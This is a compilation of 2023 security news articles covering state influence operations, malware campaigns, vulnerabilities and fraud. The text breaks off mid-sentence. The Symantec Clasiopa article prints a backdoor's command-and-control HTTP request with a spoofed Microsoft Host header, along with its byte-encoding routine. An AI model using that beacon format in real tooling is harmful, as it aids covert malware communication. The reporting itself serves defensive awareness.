      "title": "Russian covert influence operations have become ‘low-quality,’ says Meta",
      "text": " Since the beginning of the war in Ukraine, Russia’s covert influence operations on Facebook and Instagram have shied away from building convincing brands or personas, Meta announced on Thursday.Instead these operations are trying to escape the social media giant’s detection efforts by creating “a large number of low-quality accounts all at once, in the hope that at least a few might survive,” the company explained in its quarterly threat report.The activity has become less like “the stealthy and deceptive Russian influence operations we’ve disrupted in the past,” said the company, and now bears “a closer resemblance to a spammers’ playbook.”Meta said that the operators’ spam-like approach to influence operations was providing “low overall return on their activity.”The company said that the operations had a “uniquely aggressive persistence” suggesting that they “appeared to hastily respond to the state’s military actions with no time to build credibility and influence in promoting pro-Russia narratives” and “were likely paid to keep running these efforts … no matter how low the quality or impact of their work.”More traditional propaganda from Russian state-controlled media is on the wane, Meta’s threat report said, because those outlets have been banned from running ads and any posts that link to their content receive warning labels.Meta said this has had a “substantial drop” in the activity of these pages and people’s engagement with that content, despite “infrequent” attempts to evade the company’s bans and transparency requirements.“Although they are still active on our platforms, a number of Russian state-controlled media have shared posts urging followers to find them on other services instead,” the report said, suggesting the enforcement action is working.The company also said it took down 5,374 accounts and 12 groups on Facebook, as well as 100 accounts on Instagram, that were connected to a network operated by employees of the Serbian Progressive Party — the country’s ruling party — targeting domestic audiences.This network, which “ran across the internet and targeted social media services including Facebook, Instagram, Twitter, YouTube, in addition to local news media to create a perspective of widespread and authentic grassroots support for Serbian President Alexander Vučić.”It was unlike traditional troll farms, which operate in a single location or set of offices, and instead relied on individuals coordinating their efforts from across Serbia.The people behind the activity used fake accounts — some of which Meta said it detected and disabled automatically — to manipulate content by making it appear more popular than it really was, alongside posting original memes criticizing Serbian opposition figures.Meta said it was able to tie the operation to the Serbian Progressive Party, a group of employees known as its Internet Team, and state employees from around Serbia, following a tip from Twitter.The company’s threat report also announced the takedown of a network based in Cuba targeting people in that country as well as the Cuban diaspora abroad. The company’s investigation “found links to the Cuban government and its various entities,” Meta said.Alexander Martin is the UK Editor for Recorded Future News.

      "title": "Pirated Final Cut Pro for macOS Offers Stealth Malware Delivery",
      "text": " People using pirated versions of Apple's Final Cut Pro video editing software may have gotten more than they bargained for when they downloaded the software from the many illicit torrents through which it is available.For the past several months at least, an unknown threat actor has used a pirated version of the macOS software to deliver the XMRig cryptocurrency mining tool on systems belonging to people who downloaded the app.Researchers from Jamf who recently spotted the operation have been unable to determine how many users might have installed the weaponized software on their system and currently have XMRig running on them, but the level of sharing of the software suggests it could be hundreds.Jaron Bradley, macOS detections expert at Jamf, says his company spotted over 400 seeders — or users who have the complete app — making it available via torrent to those who want it. The security vendor found that the individual who originally uploaded the weaponized version of Final Cut Pro for torrent sharing is someone with a multiyear track record of uploading pirated macOS software with the same cryptominer. Software in which the threat actor had previously sneaked the malware into includes pirated macOS versions of Logic Pro and Adobe Photoshop.\"Given the relatively high number of seeders and [the fact] that the malware author has been motivated enough to continuously update and upload the malware over the course of three and a half years, we suspect it has a fairly wide reach,\" Bradley says.\"The malware author never reaches out to a website located anywhere except within the i2p network,\" Bradley says. \"All attacker tooling is downloaded over the anonymous i2p network and mined currency is sent to the attackers' wallet over i2p as well.\"With the pirated version of Final Cut Pro that Jamf discovered, the threat actor had modified the main binary so when a user double clicks the application bundle the main executable is a malware dropper. The dropper is responsible for carrying out all further malicious activity on the system including launching the cryptominer in the background and then displaying the pirated application to the user, Bradley says.As noted, one of the most notable differences between the latest version of the malware and previous versions is its increased stealth — but this has been a pattern. The earliest version — bundled into pirated macOS software back in 2019 — was the least stealthy and mined cryptocurrency all the time whether the user was at the computer or not. This made it easy to spot. A later iteration of the malware got sneakier; it would only start mining cryptocurrency when the user opened a pirated software program. \"This made it harder for users to detect the malware's activity, but it would keep mining until the user logged out or restarted the computer. Additionally, the authors started using a technique called base 64 encoding to hide suspicious strings of code associated with the malware, making it harder for antivirus programs to detect,\" Bradley says.He tells Dark Reading that with the latest version, the malware changes the process name to look identical to system processes. \"This makes it difficult for the user to distinguish the malware processes from native ones when viewing a process listing using a command-line tool.One feature that has remained consistent through the different versions of the malware is its constant monitoring of the \"Activity Monitor\" application. Users can often open the app to troubleshoot problems with their computers and in doing so could end up detecting the malware. So, \"once the malware detects that the user has opened the Activity Monitor, it immediately stops all its processes to avoid detection.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "title": "Clasiopa: New Group Targets Materials Research | Symantec Enterprise Blogs",
      "text": " A hitherto unknown attack group has been observed targeting a materials research organization in Asia. The group, which Symantec calls Clasiopa, is characterized by a distinct toolset, which includes one piece of custom malware (Backdoor.Atharvan). At present, there is no firm evidence on where Clasiopa is based or whom it acts on behalf.The infection vector used by Clasiopa is unknown, although there is some evidence to suggest that the attackers gain access through brute force attacks on public facing servers.Aside from the distinct toolset used, there were a number of attack hallmarks observed:There is some evidence to suggest that the attackers used two legitimate software packages. One compromised computer was running Agile DGS and Agile FD servers, software developed by Jiangsu. These packages are used for document security and protection in transit. Malicious files were dropped into a folder named “dgs” and one of the backdoors used was renamed from atharvan.exe to agile_update.exe. It is unclear if these software packages are being injected into or installed by the attackers.HCL Domino (formerly IBM Domino) was also run on a compromised machine in close proximity to the execution of backdoors, although it is unclear if this was a coincidence or not. However, both the Domino and Agile software appear to be using old certificates and the Agile servers use old vulnerable libraries.Atharvan is so-named because when the malware is run, it creates a mutex named: \"SAPTARISHI-ATHARVAN-101\" to ensure that only one copy is running.It will then contact a hardcoded C&C server. The hardcoded C&C addresses seen in one of the samples analyzed to date was for Amazon AWS South Korea (Seoul) region, which is not a common location for C&C infrastructure.The C&C communications are formatted as HTTP POST requests where the Host header is hardcoded as \"update.microsoft.com\", e.g.:POST /update.php HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Edg/84.0.522.52Host: update.microsoft.comContent-type: application/x-www-form-urlencodedContent-length: 46id=Atharvan&code=101&cid=H^[REDACTED]&time=5The request body includes the following parameters:When encrypting the \"msg\" value, the malware uses the following encryption algorithm:def encrypt(plaintext):    return bytes([((2 - byte) & 0xff) for byte in plaintext])The malware uses its own simplistic HTTP parser to extract the body from the server response. The extracted body is decrypted using the following algorithm:def decrypt(ciphertext):    return bytes([((2 - byte) & 0xff) for byte in ciphertext])When fetching commands, the malware expects the decrypted body to contain a sequence of strings separated by the \"\\x1A\" character.The first byte of each string specifies the command to execute and the remaining bytes are interpreted as command parameters.When configuring a communication schedule, the command parameters specify the times and days for the communication attempts. Several different times can be specified, with the hour and minute of the day encoded.The days are interpreted as:This scheduled communication configuration is another unusual feature of the malware and is not commonly seen in malware of this kind.In addition to this, one of the passwords used by the attackers for a ZIP archive was “iloveindea1998^_^”.While these details could suggest that the group is based in India, it is also quite likely that the information was planted as false flags, with the password in particular seeming to be an overly obvious clue.If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file.5b74b2176b8914b0c4e6215baab9e96d1e9a773803105cf50dac0427fac79c1b – Backdoor.Atharvan8aa6612c95c7cef49709596da43a0f8354f14d8c08128c4cb9b1f37e548f083b – Backdoor.Atharvan95f76a95adcfdd91cb626278006c164dcc46009f61f706426b135cdcfa9598e3 – Lilith940ab006769745b19de5e927d344c4a4f29cae08e716ee0b77115f5f2a2e3328 – Lilith38f0f2d658e09c57fc78698482f2f638843eb53412d860fb3a99bb6f51025b07 – Lilithc94c42177d4f9385b02684777a059660ea36ce6b070c2dba367bf8da484ee275 – Thumbsenderf93ddb2377e02b0673aac6d540a558f9e47e611ab6e345a39fd9b1ba9f37cd22 – Custom Proxy Tool3aae54592fe902be0ca1ab29afe5980be3f96888230d5842e93b3ca230f8d18d – Backdoor0550e1731a6aa2546683617bd33311326e7b511a52968d24648ea231da55b7e5 – Backdoor8023b2c1ad92e6c5fec308cfafae3710a5c47b1e3a732257b69c0acf37cb435b – Hacktool1569074db4680a9da6687fb79d33160a72d1e20f605e661cc679eaa7ab96a2cd – HacktoolThe Threat Hunter Team is a group of security experts within Symantec whose mission is to investigate targeted attacks, drive enhanced protection in Symantec products, and offer analysis that helps customers respond to attacks.We encourage you to share your thoughts on your favorite social platform."

      "title": "Popular IBM file transfer tool vulnerable to cyberattacks, CISA says",
      "text": " The IBM Aspera Faspex file transfer tool used by dozens of large organizations and businesses has a serious bug that malicious hackers are actively exploiting, according to the Cybersecurity and Infrastructure Security Agency (CISA). The agency said the IBM vulnerability poses “significant risks to the federal enterprise.” CISA directs its alerts at the federal government, but they often apply widely to the private sector as well.For any company transferring large datasets — like genomics and biomedical research, media production, military signals intelligence, or financial services — Aspera was likely the go-to solution for many years, Broomhead explained. Broomhead added that the vulnerability is easy to exploit and allows a remote attacker to take actions on a system without having to get around network authentication processes.Nucleus Security’s Ryan Cribelar said the tool is used by large companies to transfer large files or large data sets quickly and securely over long distances. “It is used by all sorts of industries from finance to healthcare to government. It is a popular IBM product, so you can assume a large customer base purely from how long the product has been around, and the fact that shops usually use multiple IBM products if they are using one,” he said. The bug is enticing to attackers for at least two reasons, Cribelar said.\"It might live on a device that doesn't get as consistent scanning coverage as other devices, and the maintaining of the device — and who is responsible — could easily get lost over time as vulnerability management programs change in-house,\" he said. \"These two factors can allow for the vulnerability to have a longer lifetime on the device.\"Cribelar added that the vulnerable software is typically found in the outer perimeter of networks, making it a valuable portal for hackers to gain persistence in a victim's system without the likelihood of being discovered quickly. Jonathan Greig is a Breaking News Reporter at Recorded Future News.

      "text": " \"While Symantec researchers didn't observe data being exfiltrated from victim machines, some of the tools deployed by Hydrochasma do allow for remote access and could potentially be used to exfiltrate data,\" researchers wrote.Judging by its tools and tactics, the group's chief motive appears to be achieving persistent access to victim machines without being detected, \"as well as an effort to escalate privileges and spread laterally across victim networks,\" they noted.Indeed, the lack of custom malware lends itself to this motive, Brigid O Gorman, senior intelligence analyst with Symantec Threat Hunter team, tells Dark Reading.\"The group's reliance on living-off-the-land and publicly available tools is notable,\" she says. \"This may tell us a number of things about the group, including a desire to stay under the radar and make attribution of their activity more difficult.\"Researchers first were alerted to concerning activity on the victim's network when they noticed the presence of SoftEther VPN, a free, open source, and cross-platform VPN software often used by attackers.In this case, the first sign of suspicious activity that researchers found on victim machines was a lure document with a file name in the organization's native language that appeared to be an email attachment for a freight company \"product specification,\" they said. Researchers also found a lure that mimicked a resume for a \"development engineer.\"Once Hydrochasma gains access to a machine, attackers drop a Fast Reverse Proxy, a tool that can expose a local server protected by a network address translation (NAT) or firewall to the Internet. That in turn drops a legitimate Microsoft Edge update file. That's followed up by another file that's actually a publicly available tool called Meterpreter — which is part of the Metasploit framework — that can be used for remote access, researchers said.In fact, in the campaign that researchers observed, the group bombarded the victim organization with what seemed like everything but the kitchen sink in a flurry of publicly available tools aimed to guarantee its presence and persistence on the network.\"It is relatively unusual to see an attack group using only open source malware in an attack chain, so this did make Hydrochasma's activity stand out to us,\" O Gorman notes.Other tools being wielded by Hydrochasma in the attack included: Gogo scanning tool, an automated scanning engine; Process Dumper, which allows attackers to dump domain passwords; AlliN scanning tool, which can be used for lateral penetration of the intranet; and Fscan, a publicly available hacktool that can scan for open ports and more.Their assault on the victim network didn't stop there, however; additional tools that researchers observed being used in the attack included: Procdump, for monitoring an application for CPU spikes and generating crash dumps; BrowserGhost, which can grab passwords from a browser; the tunneling tool Gost proxy; Ntlmrelay for intercepting validated authentication requests to access network services; and HackBrowserData, an open source tool that can decrypt browser data.Symantec included both file and network indicators of compromise in its blog post to help organizations identify if they're being targeted by Hydrochasma.The extensive use of dual-use and living-off-the-land tools by the group highlights the need for organizations to have a comprehensive security solution to detect suspicious behavior on network machines, as well as stop malware, O Gorman says: \"Organizations should adopt a defense in-depth strategy, using multiple detection, protection, and hardening technologies to mitigate risk at each point of a potential attack chain,\" she tells Dark Reading. \"Organizations should also be aware of and monitor the use of dual-use tools inside their network.\"In general, Symantec also advises implementing proper audit and control of administrative account usage, as well as the creation of profiles of usage for admin tools, \"as many of these tools are used by attackers to move laterally undetected through a network,\" O Gorman adds.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " The U.S. Federal Trade Commission (FTC) revealed today that Americans lost almost $8.8 billion to various types of scams in 2022, following a significant surge of over 30% more lost to fraud compared to the previous year.In 2021, Americans also reported losses of more than $5.8 billion to fraud, another massive increase of over 70% compared to 2020.The FTC said on Thursday that 2.4 million consumers have reported losing money to scammers, most of them falling victim to imposter scams and online shopping scams throughout the last year.The top five fraud categories also include scam reports involving prizes, sweepstakes, and lotteries, investments, and business and job opportunities.\"The second highest reported loss amount came from imposter scams, with losses of $2.6 billion reported, up from $2.4 billion in 2021.\"​The FTC added 5.1 million consumer reports to its Consumer Sentinel Network (Sentinel) secure online database in 2022, with over 1.1 million reports of identity theft filed through the FTC's IdentityTheft.gov website.Unfortunately, these stats likely reflect just a fraction of the actual harm inflicted by romance scammers, given that most frauds are never reported.You can report fraud attempts at ReportFraud.ftc.gov and file an identity theft report at IdentityTheft.gov.Once included in the Sentinel database, your report will be available to roughly 2,800 federal, state, local, and international law enforcement professionals.Each report can help investigators find the fraudsters and make it easier to discover trends and educate the public."

      "text": " A Federal grand jury in the District of Oregon has indicted four Russian nationals founders of Forsage decentralized finance (DeFi) cryptocurrency investment platform for allegedly running a global Ponzi and pyramid scheme that raised $340 million.Forsage was promoted as a \"smart contract system\" that automatically distributes income to investors based on an algorithm, not requiring manual withdrawal requests.The project promised 100% transparency, complete decentralization, peer-to-peer transactions, no owner/admin, no chance of scams or sudden shutdown, and no company or third party involved.However, the reality couldn't be farther from that, as most Forsage investors soon found out that they were making no profit and, in many cases, lost all their investments.The defendants, Vladimir Okhotnikov, Olena Oblamska, Mikhail Sergeev, and Sergey Maskalov, face charges of running aggressive false advertisements on social media, pushing misleading investment and business opportunities related to Forsage to aspiring investors.Instead of a legitimate investment system, the defendants coded and deployed smart contracts on Forsage that essentially systematized a combination of Ponzi and pyramid schemes on the Ethereum, Binance Smart Chain, and Tron blockchains.Using blockchain forensic analysis, it was confirmed that over 80% of Forsage investors received less ETH than they had invested through Forsage. About half of all investors didn't get anything at all.Court documents show that the platform's founders used malicious code to direct large portions of the investor funds outside Forsage and into cryptocurrency wallets they controlled.This contradicted Forsage's promises to investors, including that \"100% of the income goes directly and transparently to the members of the project with zero risk.\"If the four defendants are found guilty of the alleged crimes, they face a maximum prison sentence of 20 years each.It is worth noting that Forsage’s website and social media channels are still online, claiming that the platform has distributed over $2.3 billion to over 2 million investors (Twitter data), or $1.5 billion to 2.7 million investors (website data)."

      "text": " The increased use of disk wipers in cyberattacks that began with Russia's invasion of Ukraine early last year has continued unabated, and the malware has transformed into a potent threat for organizations in the region and elsewhere.Researchers at Fortinet recently analyzed attack data from the second half of 2022 and observed a startling 53% increase in threat actor use of disk wipers between the third and fourth quarters of the year. The trajectory suggests there will be no slowing down any time soon, the security vendor said.Russia-based advanced persistent threat (APT) groups — working in support of the country's military objectives in Ukraine — accounted for a lot of the initial surge in wiper use and continued activity last year. However, Fortinet's data shows that others, including financially motivated cybercriminals, hacktivist groups, and other individuals fueled the increase as well, especially toward the end of 2022.Leading up to last year, wiper activity tended to be almost nonexistent, according to Geri Revay, security researcher with Fortinet's FortiGuard Labs. But since the conflict between Russia and Ukraine started, threat actor use of the malware has exploded, he says. \"In 2022 alone we saw 16 different families targeted at 25 countries around the world,\" Revay says. \"In the second half of the year, we also started seeing a new breed of wipers, with some even open source and on GitHub, making it much more readily available for advanced persistent cybercrime campaigns,\" he says.Currently, the main motivation for the use of wiper malware appears to be focused around cyberwar and hacktivism, Revay says. But that doesn't mean threat actors won't use it in other ways, like using wipers to sabotage systems or to destroy evidence of a cybercrime.\"Most of the wiper attacks were targeting Ukrainian organizations in 2022, but that could easily have a spillover effect on other countries,\" Revay says. As an example, he points to one incident where an attack that targeted a Ukrainian satellite communication provider ended up taking 5,800 German wind turbines offline.In terms of how to prepare and how to respond to a wiper attack, \"it is very similar to a ransomware incident,\" Revay tells Dark Reading. \"If the ransom is not paid, which is the recommended approach, a ransomware can be also considered a wiper, because without the decryption key the encrypted data is as good as lost.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "title": "Post-quantum algorithm vulnerable to side channel attacks, researchers | SC Media",
      "text": "  Such attacks avoid directly targeting a system or hardware’s defenses, instead leveraging traces of the physical signals they emit (such as supply current, execution time or electromagnetic emissions) to extract secrets.More recently, the advent of deep learning-based side channel analysis has made such attacks particularly relevant for breaking encryption systems and recovering secret keys. Apart from improving the effectiveness of some attacks, it has also allowed for attacks on true random number generators and physical unclonable functions, as well as non-differential message and secret key recovery attacks on post-quantum encryption algorithms. “Deep learning based side-channel attacks can overcome conventional countermeasures such as masking, shuffling, random delays insertion, constant-weight encoding, code polymorphism, and randomized clock,” wrote researchers Elena Dubrova, Kalle Ngo and Joel Gärtner.Encryption algorithms rely on a technique known as “masking” to prevent leakage of actionable emissions and defend against side channel attacks. Using a newly developed training method for neural networks, the researchers discovered a way to extract message bits for high-order masked implementations with the probability above 99%. They also developed a new message recovery method that manipulates ciphertexts to increase the leakage of message bits, improving the rate of message recovery and eventually extracting the algorithm’s secret key.There are different orders of complexity for this type of masking, and previous experiments have found a way to execute successful side channel attacks against algorithms with third-order masked software implementations. The method developed by KTH was successful in breaking CRYSTALS-Kyber using fifth-order implementations.“To the best of our knowledge, no side-channel attack on a higher than the third order masked implementation of any LWE/LWR PKE/KEM scheme has been demonstrated until now. The presented approach is not specific for CRYSTALS-Kyber and can potentially be applied to other LWE/LWR PKE/KEM schemes,” the authors wrote.CRYSTALS-Kyber is one of four post-quantum algorithms selected by NIST after a rigorous, multi-year vetting process to develop next generation encryption standards. While the other three are meant for digital signature and identity verification, CRYSTALS-Kyber is the only general purpose algorithm selected thus far.However, Dustin Moody, a mathematician in NIST’s computer security division, told SC Media that while the agency welcomes the new research, he does not believe it represents a fatal flaw in CRYSTALS-Kyber and said NIST currently has no plans to replace or deprioritize the algorithm.Often, encryption schemes can be tweaked or altered to account for a newly discovered flaw, or experts can develop countermeasures that prevent the kind of leakage that could be used in a side channel attack. Moody said that while “a side channel attack can fatally kill an algorithm, with this particular paper, we don’t feel it does that in any way.”“On this particular implementation of Kyber, we can use this [method] to break it under the circumstances in the experiment that they’re running. So it breaks a particular implementation that they’re working with, but it didn’t break the algorithm in general,” he said, later adding “It doesn’t say anything about the security of the algorithm itself. It didn’t exploit some flaw or design weakness to show that you’ll be able to attack it more generally.”Those thoughts were echoed by Ali El Kaafarani, CEO of PQShield, which makes and sells quantum-resistant technologies. The paper appears to highlight a valid side channel attack method, but not one necessarily specific to CRYSTALS-Kyber, and it doesn't unearth any new, fundamental weaknesses in the algorithm or its underlying mathematics.“It's important to understand the difference between an algorithm and its potentially many different implementations. Any algorithm can and will inevitably have many non-secure/broken implementations, this doesn’t mean that the algorithm itself is broken, otherwise people wouldn’t still be using RSA/ECC now,\" El Kaafarani said.Still, such adjustments do come with real tradeoffs. The algorithms selected by NIST were done in part based on their efficiency. Every new protection added to account for side channel leakage slows down its performance.“For CRYSTALS-Kyber…we asked the cryptographic community to do a lot of work here, and in the second and third rounds of our process, research seemed to show that to protect Kyber pretty well, it would be about twice as slow when you added on lots of countermeasures to protect it from side channel attacks,” said Moody.Derek is a senior editor and reporter at SC Media, where he has spent the past three years providing award-winning coverage of cybersecurity news across the public and private sectors.

      "title": "New class of Apple bugs found in iOS, MacOS | SC Media",
      "text": "  New vulnerabilities in Apple’s macOS and iOS allow attackers to siphon a targeted user’s call history, calendar, address book and photos. The bugs signal bad news to Apple, according to researchers, who say they represent a new class of bugs within Apple’s security posture.The vulnerabilities “represent a significant breach of the security model of macOS and iOS, which relies on individual applications having fine-grained access to the subset of resources they need and querying higher privileged services to get anything else,” wrote Austin Emmitt, senior vulnerability researcherwith Trellix, in the report.In short, the “large new class of bugs” allow an attacker to “bypass code signing” protections that validate applications running on an iOS or macOS device are safe. Once bypassed, the un-signed code would not signal any red flag security warnings and execute — leading to escalation of privileges and sandbox escape conditions on both macOS and iOS devices. “Since the first version of iOS on the original iPhone, Apple has enforced careful restrictions on the software that can run on their mobile devices. Only applications that were cryptographically signed by a developer certificate trusted by Apple could be executed,” Emmitt wrote.These restrictions prevented malicious software from running on devices. What Trellix discovered were holes in Apple’s security approach that allows an attacker to run a malicious program, despite the code-signing requirements that identify the code’s origin, legitimacy and typically trustworthiness.The Apple vulnerabilities (CVE-2023-23531 and CVE-2023-23530) range in severity from medium to high, and are classified as privilege escalation bugs. While both bugs are serious, to exploit either vulnerability would require an adversary to already have compromised the targeted device. Apple issued patches for both with the release of its macOS 13.2 and iOS 16.3 software updates.The ForcedEntry bug was a two-stage attack. The first stage was sending the victim a PDF disguised as an image (GIF). The second stage abused Apple’s iOS sandbox component, allowing the code to “escape” and impact other system components.Trellix research focused on an Apple code filtering security tool for its sandbox called NSPredicate that was key to the ForceEntry attack chain. Emmitt said he examined the NSPredicateVisitor function, viewed as “Apple's primary mitigator of danger,” which led to the Trellix discovery. Despite an Apple patch to prevent the abuse of NSPredicate (in the context of Pegasus), Trellix found a way to bypass Apple’s mitigation efforts.As Patrick Wardle, creator of the Mac security website and tool suite Objective-See noted on Twitter, “Apple’s fixes [for the past FORCEDENTRY disclosure] were wholly useless.”The Trellix technical description of abusing weaknesses in Apple’s security approach center around Apple’s patch of NSPredicate.One example of the new class of bugs is tied to Apple’s use of a root-level process called CoreDuet, which collects data about behavior on the device. “An attacker with code execution in a process with the proper entitlements, such as Messages or Safari, can send a malicious NSPredicate and execute code with the privileges of this process,” Emmitt wrote.Additional flaws were found in OSLogService and an NSPredicate vulnerability in UIKitCore on the iPad, which could allow an attacker to access any app with no entitlements or read syslog data, respectively. In one scenario, an actor could set malicious scene activation rules to achieve code execution inside of SpringBoard and even wipe the device.The voice of healthcare cybersecurity and policy for SC Media, CyberRisk Alliance, driving industry-specific coverage of what matters most to healthcare and continuing to build relationships with industry stakeholders.Ukraine had experienced a less than a day-long power outage in October 2022 following an attack by Russian state-sponsored hacking operation Sandworm targeted at an electrical substation amid the ongoing Russia-Ukraine war, marking the first cyberattack-related power interruption in the country since 2017, CyberScoop reports.Attacks deployed by Iranian state-backed threat operation MuddyWater against Israel saw the utilization of the new MuddyC2Go command-and-control framework, which replaced the PhonyC2 custom platform following the exposure of its source code, reports The Hacker News.Israel had its technology, logistics, and transportation industries targeted by Iranian advanced persistent threat operation Charming Kitten, also known as APT35 and Imperial Kitten, last month amid its ongoing war with Palestinian militant group Hamas, according to The Record, a news site by cybersecurity firm Recorded Future.On-Demand EventOn-Demand EventOn-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

      "title": "Dutch intelligence: Many cyberattacks by Russia are not yet public knowledge",
      "text": " Many of Russia’s cyber operations against Ukraine and NATO members during the past year have not yet become public knowledge, according to a joint report published this week by two Dutch intelligence services.The fact that “the pace of Russian cyber operations is fast” is a big factor, the report said. And the nature of many targeted institutions — such as military and diplomatic agencies — leads to secrecy about their vulnerabilities.“Before and during the war, Russian intelligence and security services engaged in widespread digital espionage, sabotage and influencing against Ukraine and NATO allies,” says the report, which describes the full-blown invasion of Ukraine a year ago this week as “a turning point in history.”Russia’s target selection has been “very broad” the agencies said, meaning that even Ukrainian organizations that are not playing a “direct role in the course of the war or political decision-making” are being hacked.The joint report relays the findings of the intelligence agencies — collected through “sensitive operations using human and technical resources” — about the threat posed by the Russian state conducting cyberattacks on various institutions, physical sabotage on maritime infrastructure, and information operations.Russian threat, Western responseThe impact of “continued Russian attack attempts” in cyberspace has been “limited” thanks to Ukrainian and Western digital defenses, the joint report said, adding that Russia has “found it difficult to synchronize cyber operations with other military operations, such as airstrikes.”The largest part of Russian cyber operations were espionage activities aimed at accessing “military, diplomatic and economic information from both Ukraine and NATO allies,” said the intelligence agencies. The targets include tactical intelligence, such as the locations of military equipment and personnel.NATO members who are providing military support to Ukraine also are common targets of Russian intelligence. The joint report said that the “Dutch armed forces, ministries and embassies have also been the target of (unsuccessful) cyber espionage attempts in the past year.”“Moscow regularly attempts to digitally sabotage Ukrainian vital infrastructure and carries out constant wiper malware attacks. The sustained and very high pressure that Russia exerts with this requires constant vigilance from Ukrainian and Western defenders,” said the joint report.Despite this, “large-scale disruption has so far failed to materialize and the impact of cyber sabotage is dwarfed by the impact of physical military operations.”“The potential of cyber operations cannot be fully exploited by Russia,” the intelligence agencies added, without providing too much of an explanation. But the report said “most Russian digital attack attempts are detected prematurely or remedied quickly, thanks to far-reaching Ukrainian monitoring, detection and response measures. Ukraine receives significant help from, for example, Western intelligence services and companies.”The two agencies warned that the Ukrainian defense was “not guaranteed” and “can probably only be sustained as long as Western support remains as intensive and adaptive as the cyber operations of the Russian intelligence services.”Physical sabotage threatThe Dutch infrastructure in the North Sea includes internet cables, gas pipelines and wind farms, which the intelligence agencies warned “can be vulnerable to sabotage,” the report said. Russian ships also have been covertly mapping the Netherlands’ maritime infrastructure “and undertaking activities that indicate espionage and preparatory acts for disruption and sabotage.”For example, a Russian ship was detected at an offshore windfarm, according to the MIVD's chief, Gen. Jan Swillens. Dutch coast guard ships escorted the vessel out of the North Sea, said Swillens, who added that the Russian reconnaissance of the North Sea energy system is something the MIVD hadn't seen before.The report did not mention the suspected sabotage of the Nord Stream 1 and Nord Stream 2 natural gas pipelines, which run through the Baltic Sea.However the agencies added it was “conceivable” that Russia could seek to cause a similar physical threat to “other vital sectors, such as drinking water and energy supply, is also conceivable, as long as such attacks can be carried out covertly.”Information operationsRussia’s intelligence services “have succeeded several times in temporarily taking control of Ukrainian media broadcasts and broadcasting Russian messages,” said the report. “Subsequently, the systems of these media were digitally sabotaged.”Other incidents, such as malware aimed at disrupting Ukraine’s power supply, “are probably mainly aimed at undermining Ukrainian morale” rather than achieving a military objective, the Dutch agencies said.“To hide their involvement in covertly spreading disinformation and propaganda through digital channels, Russian intelligence services employ many techniques they also use for cyber operations,” the intelligence services warned.They added that in the case of the information operations troops within the Russian military intelligence service (GRU), it was “even partly the same units that are responsible for both cyber operations and covert influence.”Alexander Martin is the UK Editor for Recorded Future News.

      "text": " Several shipping companies and medical laboratories in an unspecified Asian country have been targeted in an ongoing espionage campaign that began in October, according to researchers from from Symantec.The hackers behind the campaign — which the researchers named Hydrochasma — have no ties to any group Symantec has researched before. The company is not publicly identifying the target nation, Brigid O Gorman, senior intelligence analyst with the Symantec Threat Hunter Team, told The Record.The researchers do not know where Hydrochasma is based, but O Gorman said the group has specifically gone after companies related to COVID-19 treatments and vaccines. “The actors did not use any custom malware, relying exclusively and extensively on publicly available and living-off-the-land tools,” she said. Using those tactics \"can help make an attack stealthier, while also making attribution more difficult.\"In its report, Symantec explained that the most likely motivation behind the campaign is intelligence gathering and potentially data exfiltration. The initial infection likely began with a phishing email because researchers found two lure documents in a victim organization’s native language related to shipping information, as well as an engineering resume. From those malicious files on one machine, the hackers were able to deploy several tools that allowed them to move around the victim’s network and expose local servers so that they could be taken over. Researchers found dozens of tools on the network that allowed for scanning, data exfiltration, remote connections and more. “The tools deployed by Hydrochasma indicate a desire to achieve persistent and stealthy access to victim machines, as well as an effort to escalate privileges and spread laterally across victim networks,” the researchers said. “While Symantec researchers didn’t observe data being exfiltrated from victim machines, some of the tools deployed by Hydrochasma do allow for remote access and could potentially be used to exfiltrate data,\" the researchers said. \"The sectors targeted also point towards the motivation behind this attack being intelligence gathering.” Jonathan Greig is a Breaking News Reporter at Recorded Future News.

      "text": " Scammers are capitalizing on the runaway popularity of and interest in ChatGPT, the natural language processing AI — impersonating it in order to infect victims with a Trojan malware called Fobo, in order to steal login credentials for business accounts.According to the report, this blatant scam has already spread to Africa, the Americas, Asia, and Europe.The researchers at Kaspersky have observed grifters running social media accounts that either impersonate the OpenAI/ChatGPT brand directly or pretend to be communities for fans of the program.Sometimes, the accounts post neutral content relating to ChatGPT, with a malicious link at the bottom. Other times, according to the blog post, they post \"fake credentials for the pre-created accounts that are said to provide access to ChatGPT. To motivate potential users even further, the attackers say that each account already has US $50 on its balance, which can be spent on using the chatbot.\"The real program has an entirely optional subscription plan but is otherwise free to use for the general public.Unwitting social media users who follow the malicious links in these posts land on a ChatGPT homepage, which is like for like with the real thing in almost every way.Clicking the \"download\" button — suspicious in itself, as ChatGPT has no desktop client — triggers the installation of an executable file.\"If this archive is unpacked and the executable file run,\" according to Kaspersky researchers, \"then, depending on the version of Windows, the user sees either a message saying installation failed for some reason, or no message at all — at which point the process seems to end.\"Behind the scenes, however, a Trojan horse has been unleashed. The Trojan looks for login credentials for apps like Google, Facebook, and TikTok, stored in the victim's browser. But in particular, Kaspersky explained, it's looking for usernames and passwords for business accounts.With employee usernames and passwords, the attackers could possibly perform more significant follow-on attacks against enterprises.\"On finding a business account in one of these services,\" the researchers explained, \"it tries to get additional information, such as how much money was spent on advertising from the account and what its current balance is.\"To avoid engaging with a malicious fake, though, Kaspersky recommended avoiding \"offers\" like those from this story, utilizing security software, and not clicking on links — better to go through a search engine or type the URL straight into your browser.As of this writing, Kaspersky has not responded to a direct request for comment by Dark Reading. So, in substitute, we asked the ChatGPT bot to provide insight on the matter. It had this to say:\"In conclusion, the rise of hackers impersonating ChatGPT to steal login credentials is a serious threat that should not be underestimated. The implications of such attacks are far-reaching and potentially devastating for individuals, organizations, and even entire industries. As technology continues to evolve, we can expect these types of attacks to become more sophisticated and difficult to detect. It is, therefore, imperative that individuals and organizations take proactive measures to protect themselves, such as regularly 